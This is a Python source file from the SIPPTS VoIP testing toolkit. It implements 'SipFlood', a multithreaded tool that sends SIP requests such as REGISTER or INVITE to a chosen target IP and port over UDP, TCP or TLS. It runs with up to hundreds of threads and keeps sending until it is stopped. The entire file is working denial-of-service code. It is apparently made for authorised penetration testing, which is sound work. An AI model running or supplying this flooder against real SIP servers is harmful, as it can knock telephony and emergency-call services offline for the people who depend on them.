#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = 'Jose Luis Verdeguer'
__version__ = '3.2'
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2022, SIPPTS"
__email__ = "pepeluxx@gmail.com"

from logging.handlers import NTEventLogHandler
import os
import socket
import signal
import sys
import ssl
import fcntl
import threading
import time
from lib.functions import create_message, get_free_port

BRED = '\033[1;31;40m'
RED = '\033[0;31;40m'
BRED_BLACK = '\033[1;30;41m'
RED_BLACK = '\033[0;30;41m'
BGREEN = '\033[1;32;40m'
GREEN = '\033[0;32;40m'
BGREEN_BLACK = '\033[1;30;42m'
GREEN_BLACK = '\033[0;30;42m'
BYELLOW = '\033[1;33;40m'
YELLOW = '\033[0;33;40m'
BBLUE = '\033[1;34;40m'
BLUE = '\033[0;34;40m'
BMAGENTA = '\033[1;35;40m'
MAGENTA = '\033[0;35;40m'
BCYAN = '\033[1;36;40m'
CYAN = '\033[0;36;40m'
BWHITE = '\033[1;37;40m'
WHITE = '\033[0;37;40m'


class SipFlood:
    def __init__(self):
        self.ip = ''
        self.host = ''
        self.rport = '5060'
        self.proto = 'UDP'
        self.method = ''
        self.domain = ''
        self.contact_domain = ''
        self.from_user = '100'
        self.from_name = ''
        self.from_domain = ''
        self.to_user = '100'
        self.to_name = ''
        self.to_domain = ''
        self.user_agent = 'pplsip'
        self.digest = ''
        self.verbose = '0'
        self.nthreads = '500'
        self.count = 0

        self.run = True

    def start(self):
        supported_protos = ['UDP', 'TCP', 'TLS']
        supported_methods = ['REGISTER', 'SUBSCRIBE', 'NOTIFY', 'PUBLISH', 'MESSAGE', 'INVITE',
                             'OPTIONS', 'ACK', 'CANCEL', 'BYE', 'PRACK', 'INFO', 'REFER', 'UPDATE']

        self.method = self.method.upper()
        self.proto = self.proto.upper()

        # if rport is by default but we want to scan TLS protocol, use port 5061
        if self.rport == 5060 and self.proto == 'TLS':
            self.rport = 5061

        if not self.verbose:
            self.verbose = '0'

        # check method
        if self.method not in supported_methods:
            print(BRED + 'Method %s is not supported' % self.method)
            sys.exit()

        # check protocol
        if self.proto not in supported_protos:
            print(BRED + 'Protocol %s is not supported' % self.proto)
            sys.exit()

        self.verbose = int(self.verbose)

        signal.signal(signal.SIGINT, self.signal_handler)
        print(BYELLOW + '\nPress Ctrl+C to stop\n')
        print(WHITE)

        print(BWHITE + '[!] Target: ' + GREEN + '%s:%s/%s' %
              (self.ip, self.rport, self.proto))
        print(BWHITE + '[!] Used threads: ' +
             GREEN + '%d' % self.nthreads)
        if self.nthreads > 300:
            print(BRED + '[x] More than 300 threads can cause socket problems')
        print(WHITE)

        threads = list()

        for i in range(self.nthreads):
            t = threading.Thread(target=self.flood, daemon=True)
            threads.append(t)
            t.start()
            time.sleep(0.1)

        for i, t in enumerate(threads):
            t.join()
 
    def signal_handler(self, sig, frame):
        self.stop()
        time.sleep(0.1)
        print(BYELLOW + '\nYou pressed Ctrl+C!')
        print(BWHITE + '\nStopping flood ... wait a moment\n')
        print(WHITE)

    def stop(self):
        self.run = False

    def flood(self):
        try:
            if self.proto == 'UDP':
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error:
            print(RED + 'Failed to create socket')
            sys.exit(1)
        fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)

        bind = '0.0.0.0'
        lport = get_free_port()

        try:
            lport = get_free_port()
            sock.bind((bind, lport))

            host = (str(self.ip), int(self.rport))

            if self.host != '' and self.domain == '':
                self.domain = self.host
            if self.domain == '':
                self.domain = self.ip
            if not self.from_domain or self.from_domain == '':
                self.from_domain = self.domain
            if not self.to_domain or self.to_domain == '':
                self.to_domain = self.domain

            if self.contact_domain == '':
                self.contact_domain = '10.0.0.1'

            msg = create_message(self.method, self.contact_domain, self.from_user, self.from_name, self.from_domain,
                                self.to_user, self.to_name, self.to_domain, self.proto, self.domain, self.user_agent, lport, '', '', '', '1', '', self.digest, 1, '', 0, '', '')

            try:
                sock.settimeout(1)

                if self.proto == 'TCP':
                    sock.connect(host)

                if self.proto == 'TLS':
                    sock_ssl = ssl.wrap_socket(
                        sock, ssl_version=ssl.PROTOCOL_TLS, ciphers=None, cert_reqs=ssl.CERT_NONE)
                    sock_ssl.connect(host)
            except:
                print('Socket connection error')
                exit()

            while self.run == True:
                try:
                    if self.proto == 'TLS':
                        sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
                    else:
                        sock.sendto(bytes(msg[:8192], 'utf-8'), host)

                    if self.verbose == 2:
                        print(BWHITE + '[+] Sending to %s:%s ...' %
                            (self.ip, self.rport))
                        print(YELLOW + msg)
                    elif self.verbose == 1:
                        print(BWHITE + '[%s] Sending %s to %s:%s/%s ...' % (str(self.count),
                            self.method.upper(), self.ip, self.rport, self.proto), end="\r")
                        self.count += 1

                except socket.timeout:
                    pass
                except:
                    pass
        except:
            pass